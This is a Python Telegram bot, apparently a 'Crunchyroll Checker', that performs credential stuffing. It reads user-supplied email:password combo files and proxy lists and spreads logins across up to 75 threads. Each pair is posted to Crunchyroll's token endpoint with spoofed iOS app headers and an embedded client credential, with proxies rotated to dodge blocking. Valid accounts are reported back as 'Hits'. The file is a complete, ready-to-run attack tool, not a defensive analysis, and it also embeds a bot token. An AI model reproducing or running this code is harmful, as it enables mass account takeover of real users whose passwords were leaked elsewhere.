import telebot
import requests
import threading
import itertools
import os

TOKEN = '7194711538:00AAHGcu6Nj4bb1Ni5dFe764rOvH48CVWaArU'  # Replace with your actual bot token
CRUNCHYROLL_URL = "https://www.crunchyroll.com/auth/v1/token"

# User states and data
user_states = {}

def reset_user_state(user_id):
    user_states[user_id] = {
        'status': 'main_menu',
        'combo_lines': [],
        'proxy_type': None,
        'proxy_lines': [],
        'proxy_cycle': None,
        'bot_count': 1,
        'threads': [],
        'stop_flag': False,
        'checked': 0,
        'hits': 0,
        'failures': 0,
        'retries': 0,
        'progress_msg_id': None,
        'progress_chat_id': None,
    }

bot = telebot.TeleBot(TOKEN)

def update_progress(user_id):
    state = user_states.get(user_id)
    if not state or not state['progress_msg_id'] or not state['progress_chat_id']:
        return
    try:
        bot.edit_message_text(
            f"Checked = {state['checked']}\nHits = {state['hits']}\nFail = {state['failures']}\nRetries = {state['retries']}",
            state['progress_chat_id'],
            state['progress_msg_id']
        )
    except Exception:
        pass

@bot.message_handler(commands=['start'])
def start_handler(message):
    user_id = message.from_user.id
    reset_user_state(user_id)
    bot.send_message(
        message.chat.id,
        "Welcome To Crunchyroll Checker Bot\n\n"
        "⚠️ Type /List If You Wanna Know All Commands\n\n"
        "Please send /combo if you want to add combo .txt file"
    )

@bot.message_handler(commands=['List'])
def list_handler(message):
    bot.send_message(
        message.chat.id,
        "/combo - Start new checking process\n"
        "/stop - Stop current checking process"
    )

@bot.message_handler(commands=['combo'])
def combo_handler(message):
    user_id = message.from_user.id
    reset_user_state(user_id)
    user_states[user_id]['status'] = 'awaiting_combo'
    bot.send_message(
        message.chat.id,
        "Please send your .txt combo file (Email:Password format, one per line)."
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    if state:
        state['stop_flag'] = True
        state['status'] = 'stopped'
    bot.send_message(
        message.chat.id,
        "Your Checking Process Stopped 🛑\n\nSend /combo again if you wanna start checking new process"
    )

@bot.message_handler(content_types=['document'])
def document_handler(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    if not state:
        bot.send_message(message.chat.id, "Please send /start first.")
        return

    file_name = message.document.file_name
    file_ext = os.path.splitext(file_name)[1].lower()
    if file_ext != ".txt":
        bot.send_message(message.chat.id, "Incorrect file type, Please send .txt file to be able go next step")
        return

    if state['status'] == 'awaiting_combo':
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        content = file.decode('utf-8', errors='ignore')
        lines = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
        if not lines:
            bot.send_message(message.chat.id, "Combo file is empty or invalid. Please send a valid .txt file.")
            return
        state['combo_lines'] = lines
        state['status'] = 'awaiting_proxy_type'
        bot.send_message(
            message.chat.id,
            "Please send .txt Proxy file\n\n"
            "/http For HTTP Proxy Type\n"
            "/socks4 For Socks4 Proxy Type\n"
            "/socks5 For Socks5 Proxy Type"
        )
    elif state['status'] == 'awaiting_proxy_file':
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        content = file.decode('utf-8', errors='ignore')
        lines = [line.strip() for line in content.split('\n') if line.strip()]
        if not lines:
            bot.send_message(message.chat.id, "Proxy file is empty or invalid. Please send a valid .txt file.")
            return
        state['proxy_lines'] = lines
        state['proxy_cycle'] = itertools.cycle(state['proxy_lines'])
        state['status'] = 'awaiting_bot_count'
        bot.send_message(
            message.chat.id,
            "Good, Now send me Bots you want to use in this process. Make sure Bots value between 1 - 75 Else Error"
        )
    else:
        bot.send_message(message.chat.id, "I am not expecting a file now. Please follow instructions.")

@bot.message_handler(commands=['http', 'socks4', 'socks5'])
def proxy_type_handler(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    if not state or state['status'] != 'awaiting_proxy_type':
        bot.send_message(message.chat.id, "I am not expecting proxy type now. Please follow instructions.")
        return

    proxy_type = message.text[1:].lower()
    state['proxy_type'] = proxy_type
    state['status'] = 'awaiting_proxy_file'
    bot.send_message(message.chat.id, f"Send your .txt proxy file for {proxy_type.upper()} proxies.")

@bot.message_handler(func=lambda m: m.text and m.text.isdigit())
def bot_count_handler(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    if not state or state['status'] != 'awaiting_bot_count':
        return
    bot_count = int(message.text)
    if not (1 <= bot_count <= 75):
        bot.send_message(message.chat.id, "Error: Bots value must be between 1 and 75.")
        return
    state['bot_count'] = bot_count
    state['status'] = 'checking'
    bot.send_message(
        message.chat.id,
        f"Checked = 0\nHits = 0\nFail = 0\nRetries = 0"
    )
    threading.Thread(target=check_accounts_multithreaded, args=(message.chat.id, user_id), daemon=True).start()

def worker_thread(user_id, combos_slice):
    state = user_states.get(user_id)
    if not state:
        return
    session = requests.Session()
    for line in combos_slice:
        if state['stop_flag']:
            return
        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()
        while True:
            if state['stop_flag']:
                return

            payload = {
                "device_id": "7B94686C-C9CD-492D-9042-47C39C149F52",
                "device_name": "iPhone",
                "device_type": "iPhone 14 Pro Max",
                "grant_type": "password",
                "password": password,
                "scope": "offline_access",
                "username": email
            }
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=utf-8",
                "authorization": "Basic b25mcGl4c3V5MWF1bjhwYWJjdzY6cGZJZzdtMHNJRVdGcVNaTV92UkE0bDctdVp5cWhDOXo=",
                "user-agent": "Crunchyroll/4.76.0 (bundle_identifier:com.crunchyroll.iphone; build_number:4113224.447891237) iOS/18.4.1 Gravity/4.76.0",
                "accept": "*/*"
            }

            proxies = None
            if state['proxy_type'] and state['proxy_cycle']:
                proxy = next(state['proxy_cycle'])
                proxy_url = f"{state['proxy_type']}://{proxy}"
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url,
                }

            try:
                resp = session.post(CRUNCHYROLL_URL, data=payload, headers=headers, timeout=15, proxies=proxies)
                text = resp.text
            except Exception:
                state['retries'] += 1
                update_progress(user_id)
                continue

            if "access_token" in text:
                state['hits'] += 1
                state['checked'] += 1
                bot.send_message(
                    state['progress_chat_id'],
                    f"Hits 🟢\n\n📧 Email : {email}\n🔐 Password : {password}"
                )
                update_progress(user_id)
                break
            elif "invalid_grant" in text:
                state['failures'] += 1
                state['checked'] += 1
                update_progress(user_id)
                break
            else:
                state['retries'] += 1
                update_progress(user_id)
                continue

def check_accounts_multithreaded(chat_id, user_id):
    state = user_states.get(user_id)
    if not state:
        return
    combos = state['combo_lines']
    total = len(combos)
    state['checked'] = 0
    state['hits'] = 0
    state['failures'] = 0
    state['retries'] = 0
    state['progress_msg_id'] = None
    state['progress_chat_id'] = chat_id

    progress_msg = bot.send_message(chat_id,
                                   f"Checked = 0\nHits = 0\nFail = 0\nRetries = 0")
    state['progress_msg_id'] = progress_msg.message_id

    bot_count = state['bot_count']
    chunks = [combos[i::bot_count] for i in range(bot_count)]

    threads = []
    for chunk in chunks:
        t = threading.Thread(target=worker_thread, args=(user_id, chunk))
        t.start()
        threads.append(t)
    state['threads'] = threads

    for t in threads:
        t.join()

    if not state['stop_flag']:
        bot.send_message(chat_id, "Your Checking Process is Completed ☑️ ")
    state['status'] = 'stopped'
    state['stop_flag'] = False

bot.infinity_polling()
